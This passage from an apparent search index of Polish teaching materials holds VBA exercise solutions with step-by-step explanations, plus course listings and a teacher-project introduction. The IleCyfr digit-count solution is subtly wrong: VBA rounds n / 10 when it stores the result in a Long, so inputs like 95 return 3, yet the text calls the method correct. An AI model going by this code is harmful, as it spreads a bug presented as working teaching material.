2</code> oblicza reszt\u0119 z dzielenia liczby <code>n</code> przez 2. Dzia\u0142anie <code>Mod</code> jest operatorem modulo, kt\u00f3ry zwraca reszt\u0119 z dzielenia.</li> <li><code>= 0</code> sprawdza, czy reszta z dzielenia przez 2 wynosi 0, co jest prawdziwe dla liczb parzystych.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-3/#3-zwrocenie-wartosci-true-lub-false","title":"3. Zwr\u00f3cenie warto\u015bci True lub False","text":"<pre><code>    CzyParzysta = True\nElse\n    CzyParzysta = False\nEnd If\n</code></pre> <ul> <li>Je\u015bli warunek <code>n Mod 2 = 0</code> jest spe\u0142niony (czyli liczba jest parzysta), funkcja przypisuje <code>True</code> do <code>CzyParzysta</code>, co oznacza, \u017ce zwr\u00f3ci warto\u015b\u0107 <code>True</code>.</li> <li><code>Else</code> oznacza, \u017ce je\u015bli warunek nie jest spe\u0142niony (liczba jest nieparzysta), funkcja przypisuje <code>False</code> do <code>CzyParzysta</code>, co oznacza, \u017ce zwr\u00f3ci warto\u015b\u0107 <code>False</code>.</li> <li><code>End If</code> ko\u0144czy struktur\u0119 warunkow\u0105.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-3/#4-koniec-funkcji","title":"4. Koniec funkcji","text":"<pre><code>End Function\n</code></pre> <ul> <li><code>End Function</code> oznacza koniec definicji funkcji.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-4/","title":"Rozwi\u0105zanie 4","text":""},{"location":"spreadsheet/vba/exercises/basic/solution-4/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz funkcj\u0119 <code>IleParzystych</code> zliczaj\u0105c\u0105 ile kom\u00f3rek z podanego zakresu zawiera liczby parzyste.</p>"},{"location":"spreadsheet/vba/exercises/basic/solution-4/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>Function IleParzystych(zakres As Range) As Integer\n    Dim wynik As Integer\n\n    wynik = 0\n\n    For Each kom In zakres\n        If kom.Value Mod 2 = 0 Then\n            wynik = wynik + 1\n        End If\n    Next kom\n\n    IleParzystych = wynik\nEnd Function\n</code></pre>"},{"location":"spreadsheet/vba/exercises/basic/solution-4/#opis-rozwiazania","title":"Opis rozwi\u0105zania","text":""},{"location":"spreadsheet/vba/exercises/basic/solution-4/#1-definicja-funkcji","title":"1. Definicja funkcji","text":"<pre><code>Function IleParzystych(zakres As Range) As Integer\n</code></pre> <ul> <li><code>Function IleParzystych</code> rozpoczyna definicj\u0119 funkcji o nazwie <code>IleParzystych</code>.</li> <li><code>zakres As Range</code> oznacza, \u017ce funkcja przyjmuje jeden argument (wej\u015bcie) o nazwie <code>zakres</code>, kt\u00f3ry jest typu <code>Range</code>. <code>Range</code> odnosi si\u0119 do zakresu kom\u00f3rek w arkuszu Excela.</li> <li><code>As Integer</code> na ko\u0144cu m\u00f3wi, \u017ce funkcja zwraca warto\u015b\u0107 ca\u0142kowit\u0105 (<code>Integer</code>).</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-4/#2-inicjalizacja-zmiennej-wynikowej","title":"2. Inicjalizacja zmiennej wynikowej","text":"<pre><code>Dim wynik As Integer\nwynik = 0\n</code></pre> <ul> <li><code>Dim wynik As Integer</code> deklaruje zmienn\u0105 <code>wynik</code> jako liczb\u0119 ca\u0142kowit\u0105.</li> <li><code>wynik = 0</code> inicjalizuje zmienn\u0105 <code>wynik</code> warto\u015bci\u0105 0. Ta zmienna b\u0119dzie s\u0142u\u017cy\u0107 do zliczania parzystych liczb.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-4/#3-petla-przez-komorki-w-zakresie","title":"3. P\u0119tla przez kom\u00f3rki w zakresie","text":"<pre><code>For Each kom In zakres\n</code></pre> <ul> <li><code>For Each kom In zakres</code> rozpoczyna p\u0119tl\u0119, kt\u00f3ra przejdzie przez ka\u017cd\u0105 kom\u00f3rk\u0119 (<code>kom</code>) w okre\u015blonym zakresie (<code>zakres</code>).</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-4/#4-sprawdzenie-parzystosci-i-zliczanie","title":"4. Sprawdzenie parzysto\u015bci i zliczanie","text":"<pre><code>    If kom.Value Mod 2 = 0 Then\n        wynik = wynik + 1\n    End If\n</code></pre> <ul> <li><code>If kom.Value Mod 2 = 0 Then</code> sprawdza, czy warto\u015b\u0107 w kom\u00f3rce (<code>kom.Value</code>) jest liczb\u0105 parzyst\u0105. Je\u015bli reszta z dzielenia warto\u015bci kom\u00f3rki przez 2 wynosi 0, to liczba jest parzysta.</li> <li><code>wynik = wynik + 1</code> inkrementuje zmienn\u0105 <code>wynik</code>, je\u015bli liczba jest parzysta.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-4/#5-przejscie-do-nastepnej-komorki","title":"5. Przej\u015bcie do nast\u0119pnej kom\u00f3rki","text":"<pre><code>Next kom\n</code></pre> <ul> <li><code>Next kom</code> ko\u0144czy bie\u017c\u0105cy cykl p\u0119tli i przechodzi do nast\u0119pnej kom\u00f3rki w zakresie.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-4/#6-zwracanie-wyniku","title":"6. Zwracanie wyniku","text":"<pre><code>IleParzystych = wynik\n</code></pre> <ul> <li>Przypisuje ostateczn\u0105 warto\u015b\u0107 zmiennej <code>wynik</code> do samej funkcji <code>IleParzystych</code>, co oznacza, \u017ce funkcja zwr\u00f3ci t\u0119 warto\u015b\u0107 jako sw\u00f3j wynik.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-4/#7-koniec-funkcji","title":"7. Koniec funkcji","text":"<pre><code>End Function\n</code></pre> <ul> <li><code>End Function</code> oznacza koniec definicji funkcji.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-5/","title":"Rozwi\u0105zanie 5","text":""},{"location":"spreadsheet/vba/exercises/basic/solution-5/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz funkcj\u0119 <code>NWW</code> zgodn\u0105 z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"spreadsheet/vba/exercises/basic/solution-5/#specyfikacja","title":"Specyfikacja","text":""},{"location":"spreadsheet/vba/exercises/basic/solution-5/#dane","title":"Dane","text":"<ul> <li>\\(a\\) - liczba naturalna</li> <li>\\(b\\) - liczba naturalna</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-5/#wynik","title":"Wynik","text":"<ul> <li>Najmniejsza wsp\u00f3lna wielokrotno\u015b\u0107 liczb \\(a\\) i \\(b\\).</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-5/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>Function NWW(a As Integer, b As Integer) As Integer\n    Dim na As Integer\n    Dim nb As Integer\n\n    na = a\n    nb = b\n\n    While na &lt;&gt; nb\n        If na &lt; nb Then\n            na = na + a\n        Else\n            nb = nb + b\n        End If\n    Wend\n\n    NWW = na\nEnd Function\n</code></pre>"},{"location":"spreadsheet/vba/exercises/basic/solution-5/#opis-rozwiazania","title":"Opis rozwi\u0105zania","text":""},{"location":"spreadsheet/vba/exercises/basic/solution-5/#1-definicja-funkcji","title":"1. Definicja funkcji","text":"<pre><code>Function NWW(a As Integer, b As Integer) As Integer\n</code></pre> <ul> <li><code>Function NWW</code> rozpoczyna definicj\u0119 funkcji o nazwie <code>NWW</code>.</li> <li><code>a As Integer, b As Integer</code> oznacza, \u017ce funkcja przyjmuje dwa argumenty (<code>a</code> i <code>b</code>), oba b\u0119d\u0105ce liczbami ca\u0142kowitymi.</li> <li><code>As Integer</code> na ko\u0144cu m\u00f3wi, \u017ce funkcja zwraca warto\u015b\u0107 ca\u0142kowit\u0105 (<code>Integer</code>).</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-5/#2-deklarowanie-i-inicjalizacja-zmiennych","title":"2. Deklarowanie i inicjalizacja zmiennych","text":"<pre><code>Dim na As Integer\nDim nb As Integer\n\nna = a\nnb = b\n</code></pre> <ul> <li><code>Dim na As Integer</code> i <code>Dim nb As Integer</code> deklaruj\u0105 dwie zmienne pomocnicze, <code>na</code> i <code>nb</code>.</li> <li><code>na = a</code> i <code>nb = b</code> inicjalizuj\u0105 te zmienne warto\u015bciami argument\u00f3w <code>a</code> i <code>b</code>. Zmienne te b\u0119d\u0105 modyfikowane w trakcie oblicze\u0144, zachowuj\u0105c oryginalne warto\u015bci <code>a</code> i <code>b</code>.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-5/#3-petla-obliczeniowa","title":"3. P\u0119tla obliczeniowa","text":"<pre><code>While na &lt;&gt; nb\n</code></pre> <ul> <li><code>While na &lt;&gt; nb</code> rozpoczyna p\u0119tl\u0119, kt\u00f3ra b\u0119dzie si\u0119 wykonywa\u0107, dop\u00f3ki <code>na</code> nie b\u0119dzie r\u00f3wne <code>nb</code>. To warunek konieczny do znalezienia NWW.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-5/#4-logika-obliczeniowa","title":"4. Logika obliczeniowa","text":"<pre><code>    If na &lt; nb Then\n        na = na + a\n    Else\n        nb = nb + b\n    End If\n</code></pre> <ul> <li><code>If na &lt; nb Then</code> sprawdza, czy <code>na</code> jest mniejsze ni\u017c <code>nb</code>.</li> <li><code>na = na + a</code> zwi\u0119ksza <code>na</code> o warto\u015b\u0107 <code>a</code>, je\u015bli <code>na</code> jest mniejsze. Cel jest taki, by zwi\u0119kszy\u0107 mniejsz\u0105 z liczb, zbli\u017caj\u0105c j\u0105 do warto\u015bci wi\u0119kszej.</li> <li><code>nb = nb + b</code> zwi\u0119ksza <code>nb</code> o warto\u015b\u0107 <code>b</code>, je\u015bli <code>na</code> jest wi\u0119ksze lub r\u00f3wne <code>nb</code>. Podobnie, cel jest taki, by zwi\u0119kszy\u0107 mniejsz\u0105 liczb\u0119.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-5/#5-koniec-petli","title":"5. Koniec p\u0119tli","text":"<pre><code>Wend\n</code></pre> <ul> <li><code>Wend</code> ko\u0144czy p\u0119tl\u0119 <code>While</code>. P\u0119tla b\u0119dzie kontynuowana, dop\u00f3ki <code>na</code> nie b\u0119dzie r\u00f3wne <code>nb</code>.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-5/#6-zwracanie-wyniku","title":"6. Zwracanie wyniku","text":"<pre><code>NWW = na\n</code></pre> <ul> <li><code>NWW = na</code> przypisuje wynik oblicze\u0144 (kt\u00f3ry teraz jest r\u00f3wny w obu zmiennych, <code>na</code> i <code>nb</code>) do samej funkcji <code>NWW</code>, co oznacza, \u017ce funkcja zwr\u00f3ci t\u0119 warto\u015b\u0107 jako sw\u00f3j wynik.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-5/#7-koniec-funkcji","title":"7. Koniec funkcji","text":"<pre><code>End Function\n</code></pre> <ul> <li><code>End Function</code> oznacza koniec definicji funkcji.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-6/","title":"Rozwi\u0105zanie 6","text":""},{"location":"spreadsheet/vba/exercises/basic/solution-6/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz funkcj\u0119 <code>IleCyfr</code> zgodn\u0105 z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"spreadsheet/vba/exercises/basic/solution-6/#specyfikacja","title":"Specyfikacja","text":""},{"location":"spreadsheet/vba/exercises/basic/solution-6/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-6/#wynik","title":"Wynik","text":"<ul> <li>Liczba cyfr liczby \\(n\\).</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-6/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>Function IleCyfr(n As Long) As Integer\n    Dim wynik As Integer\n\n    wynik = 1\n\n    While n &gt; 9\n        n = n / 10\n        wynik = wynik + 1\n    Wend\n\n    IleCyfr = wynik\nEnd Function\n</code></pre>"},{"location":"spreadsheet/vba/exercises/basic/solution-6/#opis-rozwiazania","title":"Opis rozwi\u0105zania","text":""},{"location":"spreadsheet/vba/exercises/basic/solution-6/#1-definicja-funkcji","title":"1. Definicja funkcji","text":"<pre><code>Function IleCyfr(n As Long) As Integer\n</code></pre> <ul> <li><code>Function IleCyfr</code> rozpoczyna definicj\u0119 funkcji o nazwie <code>IleCyfr</code>.</li> <li><code>n As Long</code> oznacza, \u017ce funkcja przyjmuje jeden argument (wej\u015bcie) o nazwie <code>n</code>, kt\u00f3ry jest typu <code>Long</code>. Typ <code>Long</code> to typ danych s\u0142u\u017c\u0105cy do przechowywania du\u017cych liczb ca\u0142kowitych.</li> <li><code>As Integer</code> na ko\u0144cu m\u00f3wi, \u017ce funkcja zwraca warto\u015b\u0107 ca\u0142kowit\u0105 (<code>Integer</code>).</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-6/#2-inicjalizacja-zmiennej-wynikowej","title":"2. Inicjalizacja zmiennej wynikowej","text":"<pre><code>Dim wynik As Integer\nwynik = 1\n</code></pre> <ul> <li><code>Dim wynik As Integer</code> deklaruje zmienn\u0105 <code>wynik</code> jako liczb\u0119 ca\u0142kowit\u0105.</li> <li><code>wynik = 1</code> inicjalizuje zmienn\u0105 <code>wynik</code> warto\u015bci\u0105 1, poniewa\u017c nawet liczba jednocyfrowa ma jedn\u0105 cyfr\u0119.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-6/#3-petla-obliczeniowa","title":"3. P\u0119tla obliczeniowa","text":"<pre><code>While n &gt; 9\n</code></pre> <ul> <li><code>While n &gt; 9</code> rozpoczyna p\u0119tl\u0119, kt\u00f3ra b\u0119dzie si\u0119 wykonywa\u0107, dop\u00f3ki <code>n</code> jest wi\u0119ksze ni\u017c 9. Liczba wi\u0119ksza ni\u017c 9 ma przynajmniej dwie cyfry.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-6/#4-dzielenie-liczby-i-zliczanie-cyfr","title":"4. Dzielenie liczby i zliczanie cyfr","text":"<pre><code>    n = n / 10\n    wynik = wynik + 1\n</code></pre> <ul> <li><code>n = n / 10</code> dzieli <code>n</code> przez 10. To efektywnie \"usuwa\" ostatni\u0105 cyfr\u0119 z liczby. Na przyk\u0142ad, 123 podzielone przez 10 daje 12.</li> <li><code>wynik = wynik + 1</code> inkrementuje zmienn\u0105 <code>wynik</code> o 1. Ka\u017cde podzielenie przez 10 oznacza, \u017ce znajdujemy kolejn\u0105 cyfr\u0119.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-6/#5-koniec-petli","title":"5. Koniec p\u0119tli","text":"<pre><code>Wend\n</code></pre> <ul> <li><code>Wend</code> ko\u0144czy p\u0119tl\u0119 <code>While</code>. P\u0119tla b\u0119dzie kontynuowana, dop\u00f3ki nie zostanie osi\u0105gni\u0119ty warunek <code>n &gt; 9</code>.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-6/#6-zwracanie-wyniku","title":"6. Zwracanie wyniku","text":"<pre><code>IleCyfr = wynik\n</code></pre> <ul> <li><code>IleCyfr = wynik</code> przypisuje ostateczn\u0105 warto\u015b\u0107 zmiennej <code>wynik</code> do samej funkcji <code>IleCyfr</code>, co oznacza, \u017ce funkcja zwr\u00f3ci t\u0119 warto\u015b\u0107 jako sw\u00f3j wynik.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-6/#7-koniec-funkcji","title":"7. Koniec funkcji","text":"<pre><code>End Function\n</code></pre> <ul> <li><code>End Function</code> oznacza koniec definicji funkcji.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-7/","title":"Rozwi\u0105zanie 7","text":""},{"location":"spreadsheet/vba/exercises/basic/solution-7/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz funkcj\u0119 <code>Fibonacci</code> zgodn\u0105 z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"spreadsheet/vba/exercises/basic/solution-7/#specyfikacja","title":"Specyfikacja","text":""},{"location":"spreadsheet/vba/exercises/basic/solution-7/#dane","title":"Dane","text":"<ul> <li>\\(n\\) - liczba naturalna</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-7/#wynik","title":"Wynik","text":"<ul> <li>Liczba Fibonacciego o indeksie \\(n\\).</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-7/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>Function Fibonacci(n As Integer) As Long\n    Dim a As Long\n    Dim b As Long\n    Dim temp As Long\n\n    a = 0\n    b = 1\n\n    For i = 1 To n\n        temp = a + b\n        a = b\n        b = temp\n    Next i\n\n    Fibonacci = a\nEnd Function\n</code></pre>"},{"location":"spreadsheet/vba/exercises/basic/solution-7/#opis-rozwiazania","title":"Opis rozwi\u0105zania","text":""},{"location":"spreadsheet/vba/exercises/basic/solution-7/#1-definicja-funkcji","title":"1. Definicja funkcji","text":"<pre><code>Function Fibonacci(n As Integer) As Long\n</code></pre> <ul> <li><code>Function Fibonacci</code> rozpoczyna definicj\u0119 funkcji o nazwie <code>Fibonacci</code>.</li> <li><code>n As Integer</code> oznacza, \u017ce funkcja przyjmuje jeden argument (wej\u015bcie) o nazwie <code>n</code>, kt\u00f3ry jest typu <code>Integer</code>.</li> <li><code>As Long</code> na ko\u0144cu m\u00f3wi, \u017ce funkcja zwraca warto\u015b\u0107 typu <code>Long</code> (u\u017cywany do przechowywania du\u017cych liczb ca\u0142kowitych).</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-7/#2-deklarowanie-i-inicjalizacja-zmiennych","title":"2. Deklarowanie i inicjalizacja zmiennych","text":"<pre><code>Dim a As Long\nDim b As Long\nDim temp As Long\n\na = 0\nb = 1\n</code></pre> <ul> <li><code>Dim a As Long</code>, <code>Dim b As Long</code> i <code>Dim temp As Long</code> deklaruj\u0105 trzy zmienne typu <code>Long</code>.</li> <li><code>a</code> i <code>b</code> s\u0105 inicjalizowane warto\u015bciami pocz\u0105tkowymi ci\u0105gu Fibonacciego: 0 i 1.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-7/#3-petla-obliczeniowa","title":"3. P\u0119tla obliczeniowa","text":"<pre><code>For i = 1 To n\n</code></pre> <ul> <li><code>For i = 1 To n</code> rozpoczyna p\u0119tl\u0119, kt\u00f3ra b\u0119dzie wykonywana <code>n</code> razy.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-7/#4-obliczanie-kolejnego-wyrazu-ciagu","title":"4. Obliczanie kolejnego wyrazu ci\u0105gu","text":"<pre><code>    temp = a + b\n    a = b\n    b = temp\n</code></pre> <ul> <li><code>temp = a + b</code> oblicza kolejny wyraz ci\u0105gu, dodaj\u0105c dwie ostatnie liczby.</li> <li><code>a = b</code> przypisuje warto\u015b\u0107 <code>b</code> do <code>a</code>. Teraz <code>a</code> jest drugim z ostatnich dw\u00f3ch wyraz\u00f3w ci\u0105gu.</li> <li><code>b = temp</code> przypisuje obliczon\u0105 sum\u0119 do <code>b</code>. Teraz <code>b</code> jest najnowszym wyrazem ci\u0105gu.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-7/#5-koniec-petli","title":"5. Koniec p\u0119tli","text":"<pre><code>Next i\n</code></pre> <ul> <li><code>Next i</code> ko\u0144czy bie\u017c\u0105cy cykl p\u0119tli i przechodzi do nast\u0119pnego, zwi\u0119kszaj\u0105c <code>i</code>.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-7/#6-zwracanie-wyniku","title":"6. Zwracanie wyniku","text":"<pre><code>Fibonacci = a\n</code></pre> <ul> <li><code>Fibonacci = a</code> przypisuje ostateczn\u0105 warto\u015b\u0107 zmiennej <code>a</code> do samej funkcji <code>Fibonacci</code>, co oznacza, \u017ce funkcja zwr\u00f3ci t\u0119 warto\u015b\u0107 jako sw\u00f3j wynik. <code>a</code> reprezentuje n-ty wyraz ci\u0105gu Fibonacciego.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-7/#7-koniec-funkcji","title":"7. Koniec funkcji","text":"<pre><code>End Function\n</code></pre> <ul> <li><code>End Function</code> oznacza koniec definicji funkcji.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-8/","title":"Rozwi\u0105zanie 8","text":""},{"location":"spreadsheet/vba/exercises/basic/solution-8/#tresc-zadania","title":"Tre\u015b\u0107 zadania","text":"<p>Napisz funkcj\u0119 <code>ZWielkiej</code> zgodn\u0105 z poni\u017csz\u0105 specyfikacj\u0105.</p>"},{"location":"spreadsheet/vba/exercises/basic/solution-8/#specyfikacja","title":"Specyfikacja","text":""},{"location":"spreadsheet/vba/exercises/basic/solution-8/#dane","title":"Dane","text":"<ul> <li>\\(wyraz\\) - ci\u0105g znak\u00f3w</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-8/#wynik","title":"Wynik","text":"<ul> <li>Podany wyraz, w kt\u00f3rym pierwsza litera jest wielka.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-8/#rozwiazanie","title":"Rozwi\u0105zanie","text":"<pre><code>Function ZWielkiej(wyraz As String) As String\n    Dim wynik As String\n    Dim pierwsza As String\n\n    pierwsza = Left(wyraz, 1)\n    wynik = Right(wyraz, Len(wyraz) - 1)\n    wynik = UCase(pierwsza) + wynik\n\n    ZWielkiej = wynik\nEnd Function\n</code></pre>"},{"location":"spreadsheet/vba/exercises/basic/solution-8/#opis-rozwiazania","title":"Opis rozwi\u0105zania","text":""},{"location":"spreadsheet/vba/exercises/basic/solution-8/#1-definicja-funkcji","title":"1. Definicja funkcji","text":"<pre><code>Function ZWielkiej(wyraz As String) As String\n</code></pre> <ul> <li><code>Function ZWielkiej</code> rozpoczyna definicj\u0119 funkcji o nazwie <code>ZWielkiej</code>.</li> <li><code>wyraz As String</code> oznacza, \u017ce funkcja przyjmuje jeden argument (wej\u015bcie) o nazwie <code>wyraz</code>, kt\u00f3ry jest typu <code>String</code> (ci\u0105g znak\u00f3w).</li> <li><code>As String</code> na ko\u0144cu m\u00f3wi, \u017ce funkcja zwraca warto\u015b\u0107 typu <code>String</code> (ci\u0105g znak\u00f3w).</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-8/#2-deklarowanie-i-inicjalizacja-zmiennych","title":"2. Deklarowanie i inicjalizacja zmiennych","text":"<pre><code>Dim wynik As String\nDim pierwsza As String\n</code></pre> <ul> <li><code>Dim wynik As String</code> deklaruje zmienn\u0105 <code>wynik</code> jako ci\u0105g znak\u00f3w.</li> <li><code>Dim pierwsza As String</code> deklaruje zmienn\u0105 <code>pierwsza</code> r\u00f3wnie\u017c jako ci\u0105g znak\u00f3w.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-8/#3-ekstrakcja-pierwszej-litery-i-reszty-wyrazu","title":"3. Ekstrakcja pierwszej litery i reszty wyrazu","text":"<pre><code>pierwsza = Left(wyraz, 1)\nwynik = Right(wyraz, Len(wyraz) - 1)\n</code></pre> <ul> <li><code>pierwsza = Left(wyraz, 1)</code> przypisuje pierwsz\u0105 liter\u0119 wyrazu do zmiennej <code>pierwsza</code>.</li> <li><code>wynik = Right(wyraz, Len(wyraz) - 1)</code> przypisuje reszt\u0119 wyrazu (opr\u00f3cz pierwszej litery) do zmiennej <code>wynik</code>.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-8/#4-zmiana-pierwszej-litery-na-wielka","title":"4. Zmiana pierwszej litery na wielk\u0105","text":"<pre><code>wynik = UCase(pierwsza) + wynik\n</code></pre> <ul> <li><code>UCase(pierwsza)</code> zmienia pierwsz\u0105 liter\u0119 na wielk\u0105.</li> <li><code>+ wynik</code> dodaje reszt\u0119 wyrazu (kt\u00f3ra pozostaje bez zmian) do zmienionej pierwszej litery.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-8/#5-zwracanie-wyniku","title":"5. Zwracanie wyniku","text":"<pre><code>ZWielkiej = wynik\n</code></pre> <ul> <li><code>ZWielkiej = wynik</code> przypisuje ostateczn\u0105 warto\u015b\u0107 zmiennej <code>wynik</code> do samej funkcji <code>ZWielkiej</code>, co oznacza, \u017ce funkcja zwr\u00f3ci t\u0119 warto\u015b\u0107 jako sw\u00f3j wynik.</li> </ul>"},{"location":"spreadsheet/vba/exercises/basic/solution-8/#6-koniec-funkcji","title":"6. Koniec funkcji","text":"<pre><code>End Function\n</code></pre> <ul> <li><code>End Function</code> oznacza koniec definicji funkcji.</li> </ul>"},{"location":"studies/","title":"Studia","text":"<p>Materia\u0142y zwi\u0105zane z zaj\u0119ciami, kt\u00f3re prowadz\u0119 na Wydziale Matematyki i Informatyki Uniwersytetu Miko\u0142aja Kopernika w Toruniu.</p>"},{"location":"studies/algorithms-and-programming-basics/","title":"Podstawy algorytmiki i programowania","text":""},{"location":"studies/algorithms-and-programming-basics/#listy-zadan","title":"Listy zada\u0144","text":"<p> Lista I - sposoby zapisu algorytmu</p> <p> Lista II - tablice i teksty</p> <p> Lista III - funkcje</p> <p> Lista IV - rekurencja</p> <p> Lista V - struktury i pliki</p> <p> Lista VI - z\u0142o\u017cono\u015b\u0107</p> <p> Lista VII - metody projektowania algorytm\u00f3w</p> <p> Lista VIII - wska\u017aniki</p>"},{"location":"topics/","title":"Wst\u0119p","text":"<p>Informatyka: Trudne Tematy w Najprostszy Spos\u00f3b</p> <p>Dydaktyka informatyki jest du\u017cym wyzwaniem, szczeg\u00f3lnie w szkole. Wcze\u015bniej podstawa programowa w zakresie podstawowym ogranicza\u0142a si\u0119 przede wszystkim do technologii informatycznych, co oznacza, \u017ce uczono g\u0142\u00f3wnie podstaw wykorzystania pakietu biurowego. W pewnym momencie uleg\u0142o to jednak znacznej zmianie i teraz ju\u017c od szko\u0142y podstawowej m\u00f3wi si\u0119 o algorytmice, my\u015bleniu komputacyjnym i programowaniu. Chocia\u017c jest to niew\u0105tpliwie wa\u017cna i pozytywna zmiana, to stawia ona jeszcze wi\u0119ksze wyzwania przed nauczycielami. W por\u00f3wnaniu do innych przedmiot\u00f3w, takich jak chocia\u017cby matematyka, dydaktyka informatyki jest wci\u0105\u017c bardzo m\u0142oda i wci\u0105\u017c poszukiwane s\u0105 skuteczne metody t\u0142umaczenia wielu zagadnie\u0144. Dlatego postanowili\u015bmy stworzy\u0107 co\u015b, co nazwali\u015bmy projektem Trudne Tematy w Najprostszy Spos\u00f3b. Jest to zestaw gotowych materia\u0142\u00f3w dla nauczycieli, zawieraj\u0105cy ca\u0142e scenariusze lekcji, konspekty, prezentacje, kt\u00f3re mo\u017cna wykorzysta\u0107, by przybli\u017cy\u0107 uczniom tematy z dziedziny informatyki uwa\u017cane za szczeg\u00f3lnie trudne.</p>"},{"location":"topics/#cele-i-zaozenia","title":"Cele i za\u0142o\u017cenia","text":"<ul> <li>Komplet materia\u0142\u00f3w   Prezentacje, zadania i ich rozwi\u0105zania, konspekty, materia\u0142y dodatkowe... Przygotowali\u015bmy pe\u0142en komplet materia\u0142\u00f3w potrzebnych do przeprowadzenia lekcji od pocz\u0105tku do ko\u0144ca.</li> <li>Jak najpro\u015bciej   Materia\u0142y zosta\u0142y przygotowane w taki spos\u00f3b, aby ka\u017cdy, posiadaj\u0105cy nawet minimaln\u0105 wiedz\u0119 w zakresie informatyki i programowania, m\u00f3g\u0142 na ich podstawie przeprowadzi\u0107 zaj\u0119cia.</li> <li>Uniwersalno\u015b\u0107   Starali\u015bmy si\u0119 dostosowa\u0107 wszystkie materia\u0142 w taki spos\u00f3b, aby by\u0142y mo\u017cliwie niezale\u017cne od konkretnego \u015brodowiska, szko\u0142y i technologii.</li> <li>Bezp\u0142atnie   Wszystkie materia\u0142y udost\u0119pniamy ca\u0142kowicie bezp\u0142atnie, na licencji CC Uznanie Autorstwa-Na tych samych warunkach 4.0.</li> </ul>"},{"location":"topics/#autorzy-projektu","title":"Autorzy projektu","text":"<ul> <li>mgr Damian Kurpiewski</li> <li>dr Krzysztof Skowronek</li> </ul>"},{"location":"topics/#krotka-prezentacja-na-temat-projektu","title":"Kr\u00f3tka prezentacja na temat projektu","text":""},{"location":"topics/#licencja","title":"Licencja","text":""},{"location":"topics/algorithms-introduction/","title":"Wprowadzenie do algorytm\u00f3w","text":"<p>Algorytmy - od przepisu na pierniczki po znajdowania \u015bcie\u017cki w grafie - mamy z nimi do czynienia na co dzie\u0144 i cz\u0119sto nie zdajemy sobie z tego sprawy. Mi\u0119dzy innymi w\u0142a\u015bnie dlatego bardzo wa\u017cne jest dobre zrozumienie ich natury i podstawowych sk\u0142adnik\u00f3w. Algorytmy liniowe, p\u0119tle, instrukcje warunkowe - to wszystko i wi\u0119cej zawarte jest w temacie \"Wprowadzenie do algorytm\u00f3w\".</p>"},{"location":"topics/algorithms-introduction/#sugestie-dla-nauczycieli","title":"Sugestie dla nauczycieli","text":"<ol> <li>Niniejsza propozycja zaj\u0119\u0107 ma charakter uniwersalny. Niezbywalnym obowi\u0105zkiem nauczyciela jest jej dostosowanie  do konkretnej grupy uczni\u00f3w.</li> <li>Optymalnym wydaje si\u0119 realizowanie tematu nie wcze\u015bniej ni\u017c w IV i nie p\u00f3\u017aniej ni\u017c w VI klasie szko\u0142y podstawowej. Ze wzgl\u0119du na specyfik\u0119 realizacji tematu nie ma przeciwwskaza\u0144 co do realizacji w wy\u017cszych klasach  \u2013 je\u015bli b\u0119dzie to po\u017cyteczne lub konieczne. W przypadku realizacji w m\u0142odszych klasach (IV, V), w zale\u017cno\u015bci od skuteczno\u015bci realizacji lekcji I i II mo\u017cna zdecydowa\u0107 o 